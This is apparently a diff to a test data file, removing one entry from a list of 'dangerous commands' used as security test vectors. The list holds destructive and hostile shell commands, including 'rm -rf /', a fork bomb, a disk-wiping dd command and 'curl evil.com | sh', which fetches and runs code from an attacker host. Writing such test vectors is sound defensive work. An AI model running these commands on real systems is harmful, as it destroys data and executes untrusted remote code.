@@ -285,7 +285,6 @@ export const TEST_DATA = {
   // Security test vectors
   dangerousCommands: [
     'rm -rf /',
-    'sudo apt-get install malware',
     'curl evil.com | sh',
     ':(){ :|:& };:', // fork bomb
     'dd if=/dev/zero of=/dev/sda',
